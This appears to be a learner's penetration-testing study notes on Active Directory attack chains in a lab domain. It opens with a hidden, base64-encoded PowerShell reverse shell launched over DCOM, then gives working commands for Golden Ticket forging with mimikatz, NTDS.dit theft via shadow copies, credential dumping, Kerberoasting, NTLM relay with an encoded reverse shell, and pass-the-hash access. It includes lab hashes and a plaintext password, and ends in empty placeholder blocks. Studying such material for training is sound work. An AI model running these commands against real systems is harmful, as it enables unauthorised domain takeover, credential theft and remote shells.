$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIAMgA2ACIALAA4ADQANAAzACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==","7")
```

`nc -lnvp 443`

# **Active Directory Persistence**

```jsx
Note that in many real-world penetration tests or red-team engagements, persistence is not part of the scope due to the risk of incomplete removal once the assessment is complete.
```

## **Golden Ticket**

```jsx
Returning to the explanation of Kerberos authentication, we'll recall that when a user submits a request for a TGT, the KDC encrypts the TGT with a secret key known only to the KDCs in the domain. This secret key is the password hash of a domain user account called krbtgt.

If we can get our hands on the krbtgt password hash, we could create our own self-made custom TGTs, also known as golden tickets.
```

```jsx
Although this technique's name resembles the Silver Ticket one that we encountered in the Attacking Authentication Module, Golden Tickets provide a more powerful attack vector. While Silver Tickets aim to forge a TGS ticket to access a specific service, Golden Tickets give us permission to access the entire domain's resources, as we'll see shortly.
```

```jsx
At this stage of the engagement, the golden ticket will require us to have access to a Domain Admin's group account or to have compromised the domain controller itself to work as a persistence method.
```

`privilege::debug`

`lsadump::lsa /patch`

Having obtained the NTLM hash of the *krbtgt* account, along with the
domain SID, we can now forge and inject our golden ticket.

IMPORTANT

```jsx
Creating the golden ticket and injecting it into memory does not require any administrative privileges and can even be performed from a computer that **is not joined to the domain**.
```

```jsx
Let's move back to CLIENT74 as the jen user. Before we generate the golden ticket let's launch mimikatz and delete any existing Kerberos tickets with kerberos::purge.
```

`kerberos::purge`

**`whoami /user` domain sid ( remove last - )**

```jsx
This time, we'll use the /krbtgt option instead of /rc4 to indicate we are supplying the password hash of the krbtgt user account. Starting July 2022, Microsoft improved the authentication process, so we'll need to provide an existing account. Let's set the golden ticket's username to jen. Before it didn't matter if the account existed.
```

`kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt`

MAYBE USEFUL

```jsx
Mimikatz provides two sets of default values when using the golden ticket option: the user ID and the groups ID. The user ID is set to 500 by default, which is the RID of the built-in administrator for the domain. The values for the groups ID consist of the most privileged groups in Active Directory, including the Domain Admins group.
```

**`misc::cmd`**

`PsExec.exe \\dc1 cmd.exe`

`ipconfig`

Great! We now have an interactive command prompt on the domain
controller. Now let's use the **whoami** command to verify that our
user *jen* is now part of the Domain Admin group.

**INFO**

If we were to connect PsExec to the IP address of the domain controller instead of the hostname, we would instead force the use of NTLM authentication and access would still be blocked. This is illustrated in the listing below.

`psexec.exe \\192.168.50.70 cmd.exe`

## **Shadow Copies**

```jsx
A Shadow Copy, also known as Volume Shadow Service (VSS) is a Microsoft backup technology that allows the creation of snapshots of files or entire volumes.

To manage volume shadow copies, the Microsoft signed binary vshadow.exe is offered as part of the Windows SDK.

As domain admins, we can abuse the vshadow utility to create a Shadow Copy that will allow us to extract the Active Directory Database NTDS.dit database file. Once we've obtained a copy of the database, we need the SYSTEM hive, and then we can extract every user credential offline on our local Kali machine.
```

`vshadow.exe -nw -p  C:`

Note this : 

 `Shadow copy device name:` 

`copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak`

`reg.exe save hklm\system c:\system.bak`

```jsx
Once the two .bak files are moved to our Kali machine, we can continue extracting the credential materials with the secretsdump tool from the impacket suite. We'll supply the ntds database with the -ntds parameter and the system hive with the -system parameter. Then we will tell impact to parse the files locally by adding the LOCAL keyword.
```

`impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL`

### **Assembling the Pieces**

Scanning

`sudo nmap -sC -sV -oN mailsrv1/nmap 192.168.50.242`

```jsx
As we may not be familiar with hMailServer, we can research this application by browsing the application's web page. It states that hMailServer is a free, open-source e-mail server for Microsoft Windows.
```

```jsx
Even if we had found a vulnerability with a matching exploit providing the code execution, we should not skip the remaining enumeration steps. While we may get access to the target system, we could potentially miss out on vital data or information for other services and systems.
```

IIS PAGE

```jsx
gobuster dir -u http://192.168.50.242 -w /usr/share/wordlists/dirb/common.txt -o mailsrv1/gobuster -x txt,pdf,config,ini
```

```jsx
We cannot use the mail server at this moment. If we identify valid credentials and targets later in the penetration test, we could perhaps use the mail server to send a phishing email, for example.
```

**WEBSRV1**

`sudo nmap -sC -sV -oN websrv1/nmap 192.168.50.244`

```jsx
 "OpenSSH 8.9p1 Ubuntu 3" string into a search engine. The results contain a link to the Ubuntu Launchpad web page, which contains a list of OpenSSH version information mapped to specific Ubuntu releases. In our example, the version is mapped to Jammy Jellyfish, which is the version name for Ubuntu 22.04.
```

CMS

```jsx
Let's inspect the web page's source code to determine the technology being used by right-clicking in our browser on Kali and selecting View Page Source. For most frameworks and web solutions, such as CMS's, we can find artifacts and string indicators in the source code.
```

WPSCAN

```jsx
wpscan --url http://192.168.50.244 --enumerate p --plugins-detection aggressive -o websrv1/wpscan
```

IMPORTANT

```jsx
Instead of using WPScan's vulnerability database, let's use searchsploit to find possible exploits for vulnerabilities in the installed plugins
```

## IMPORTANT

```jsx
for priv esc sometimes u need to make tunnel and then surf the internal website
$ proxychains4 nmap 127.0.0.1 -sT                         
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-13 12:25 PKT
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000044s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE SERVICE
80/tcp   open  http
1080/tcp open  socks
8000/tcp open  http-alt

```

- Use vulnerabilities in WordPress Plugins
- Crack the passphrase of an SSH private key
- Elevate privileges using sudo commands
- Leverage developer artifacts to obtain sensitive information

VERY VERY IMPORTANT

```jsx
In this example, we'll attempt to retrieve an SSH private key with the name id_rsa. The name will differ depending on the specified type when creating an SSH private key with ssh-keygen. For example, when choosing ecdsa as the type, the resulting SSH private key is named id_ecdsa by default.
```

`./linpeas.sh`

```jsx
Another interesting aspect of this finding is the path displayed starts with /srv/www/wordpress/. The WordPress instance is not installed in /var/www/html where web applications are commonly found on Debian-based Linux systems. While this is not an actionable result, we should keep it in mind for future steps.
```

### .GIT

```jsx
root@websrv1:/home/daniela# cd /srv/www/wordpress/

root@websrv1:/srv/www/wordpress# git status
HEAD detached at 612ff57
nothing to commit, working tree clean

root@websrv1:/srv/www/wordpress# git log
commit 612ff5783cc5dbd1e0e008523dba83374a84aaf1 (HEAD -> master)
Author: root <root@websrv1>
Date:   Tue Sep 27 14:26:15 2022 +0000

    Removed staging script and internal network access

commit f82147bb0877fa6b5d8e80cf33da7b8f757d11dd
Author: root <root@websrv1>
Date:   Tue Sep 27 14:24:28 2022 +0000

    initial commit
    
    
git show 612ff5783cc5dbd1e0e008523dba83374a84aaf1    
```

```jsx
Our next step is to use crackmapexec and check these credentials against SMB on MAILSRV1. We'll specify --continue-on-success to avoid stopping at the first valid credentials.
```

```jsx
We should be aware that CrackMapExec outputs STATUS_LOGON_FAILURE when a password for an existing user is not correct, but also when a user does not exist at all. Therefore, we cannot be sure at this point that the domain user accounts daniela and marcus even exist.
```

VERY VERY IMPORTANT

```jsx
Now that we have valid domain credentials, we need to come up with a plan for our next steps. Reviewing the CrackMapExec output and the port scan for MAILSRV1, we don't have many options. We have identified the mail server and SMB, but no services such as WinRM or RDP. In addition, the scan showed that john is not a local administrator on MAILSRV1 as indicated by the missing Pwn3d!.

This provides us with two options. We can further enumerate SMB on MAILSRV1 and check for sensitive information on accessible shares or we can prepare a malicious attachment and send a phishing email as john to daniela and marcus.
```

```jsx
We should be aware that CrackMapExec outputs STATUS_LOGON_FAILURE when a password for an existing user is not correct, but also when a user does not exist at all. Therefore, we cannot be sure at this point that the domain user accounts daniela and marcus even exist.
```

Phishing then : 

`.\winPEAS.exe`

**Therefore, it is not necessary to get administrative privileges on every machine.**

Bloodhound

`MATCH (m:Computer) RETURN m`
`MATCH (m:User) RETURN m`

```jsx

    Find Workstations where Domain Users can RDP
    Find Servers where Domain Users can RDP
    Find Computers where Domain Users are Local Admin
    Shortest Path to Domain Admins from Owned Principals

```

If no vector on bloodhound then try this :

```jsx
In this section, we'll further enumerate the target network to identify potential attack vectors. First, we'll review all active user sessions on machines. Then, we'll examine user accounts for the existence of SPNs. Finally, we'll leverage tools such as Nmap and CrackMapExec via a SOCKS5 proxy to identify accessible services.
```

```jsx
To review active sessions, we'll again use a custom query in BloodHound. Since Cypher is a querying language, we can build a relationship query with the following syntax (NODES)-[:RELATIONSHIP]->(NODES).
```

```jsx
The relationship for our use case is [:HasSession]. The first node of the relationship specified by a property is (c:Computer) and the second is (m:User). Meaning, the edge between the two nodes has its source at the computer object. We'll use p to store and display the data.
```

`MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p`

![37e29d672f48f806c33d73622e1abf81-atp_svc_bhsessions2.png](37e29d672f48f806c33d73622e1abf81-atp_svc_bhsessions2.png)

```jsx
Interestingly, the previously identified domain administrator account beccy has an active session on MAILSRV1. If we manage to get privileged access to this machine, we can potentially extract the NTLM hash for this user.
```

```jsx
this means that the local Administrator (indicated by RID 500) has an active session on INTERNALSRV1.
```

```jsx
Our next step is to identify all kerberoastable users in the domain. To do so, we can use the List all Kerberoastable Accounts pre-built query in BloodHound.
```

Let's examine the SPN for *daniela* in BloodHound via the *Node Info*
menu by clicking on the node.

However, as we have stated before, finding an actionable vector should not interrupt our enumeration process. We should collect all information, prioritize it, and then perform potential attacks.

`set ExitOnSession false`

Now, let's start a *multi/handler* listener with the corresponding
settings in Metasploit. In addition, we'll **set** the option
**ExitOnSession** to **false**. It specifies that the listener stays
active for new sessions without the need to restart it for every
incoming session.

`proxychains -q crackmapexec smb 172.16.6.240-241 172.16.6.254 -u john -d [beyond.com](http://beyond.com/) -p "dqsTwTpZPn#nL" --shares`

```jsx
The output also states that MAILSRV1 and INTERNALSRV1 have SMB signing set to False. Without this security mechanism enabled, we can potentially perform relay attacks if we can force an authentication request.
```

`sudo proxychains -q nmap -sT -oN nmap_servers -Pn -p 21,80,443 172.16.6.240 172.16.6.241 172.16.6.254`

**-sT** to perform a TCP connect
scan. Otherwise, Nmap will not work over Proxychains.

ALso browse web after tunnel

If error :

```jsx
kali@kali:~/beyond$ cat /etc/hosts                         
127.0.0.1       localhost
127.0.1.1       kali
...
127.0.0.1    internalsrv1.beyond.com
```

```jsx
Let's try to log in with the credentials we've obtained so far as well as common username and password pairs, such as admin:admin. Unfortunately, none of them work.
```

- Perform Kerberoasting
- Abuse a WordPress Plugin function for a Relay attack

`proxychains -q impacket-GetUserSPNs -request -dc-ip 172.16.6.240 [beyond.com/john](http://beyond.com/john)`

Next, let's try to log in to WordPress at **/wp-admin** via our
forwarded port.

```jsx
The WordPress Address (URL) and Site Address (URL) are DNS names as we assumed. All other settings in Settings are mostly default values. Let's review the installed plugins next.
```

```jsx
Figure 22 shows three plugins, but only Backup Migration is enabled. Let's click on Manage, which brings us to the plugin configuration page. Clicking through the menus and settings, we discover the Backup directory path.
```

```jsx
The first is to upload a malicious WordPress plugin to INTERNALSRV1. By preparing and uploading a web shell or reverse shell, we may be able to obtain code execution on the underlying system.

For the second attack vector, we must review the BloodHound results again and make some assumptions. As we have discovered, the local Administrator account has an active session on INTERNALSRV1. Based on this session, we can assume that this user account is used to run the WordPress instance.
```

```jsx
Based on this information, let's define a plan for the second attack vector. First, we'll attempt to force an authentication request by abusing the Backup directory path of the Backup Migration WordPress plugin on INTERNALSRV1. By setting the destination path to our Kali machine, we can use impacket-ntlmrelayx to relay the incoming connection to MAILSRV1. If our assumptions are correct, the authentication request is made in the context of the local Administrator account on INTERNALSRV1, which has the same password as the local Administrator account on MAILSRV1.
```

Let's set up **impacket-ntlmrelayx** before we modify the
*Backup directory path* in the WordPress plugin. We'll use
**--no-http-server** and **-smb2support** to disable the HTTP server
and enable SMB2 support. We'll specify the external address for
MAILSRV1, 192.168.50.242, as target for the relay attack. By entering
the external address, we don't have to proxy our relay attack via
Proxychains. Finally, we'll base64-encode a [*PowerShell reverse shell
oneliner*](https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3)
that will connect back to our Kali machine on port 9999 and provide it
as a command to **-c**.

`sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.242 -c "powershell -enc JABjAGwAaQ...”`

`nc -nvlp 9999`

`.\mimikatz.exe`

`proxychains -q impacket-psexec -hashes 00000000000000000000000000000000:f0397ec5af49971f6efbdb07877046b3 [beccy@172.16.6.240](mailto:beccy@172.16.6.240)`

kiero

```cpp

```

Berlin

```cpp

```

Gust

```cpp

```

OSCPC

```jsx

```

ZEUS

```cpp

```
